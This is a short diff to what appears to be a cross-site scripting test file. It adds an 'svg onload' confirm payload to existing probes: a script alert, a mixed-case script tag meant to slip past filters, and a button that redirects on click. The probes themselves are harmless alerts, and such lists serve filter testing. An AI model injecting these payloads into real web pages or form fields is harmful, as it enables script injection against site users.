@@ -1,3 +1,4 @@
+test<svg/onload=confirm(/testing/)>
 <input type="button" value="CrackXSS" onclick="window.location.href='forbidden_txt.html'">
 <script>alert(123);</script>
 <ScRipT>alert("XSS");</ScRipT>
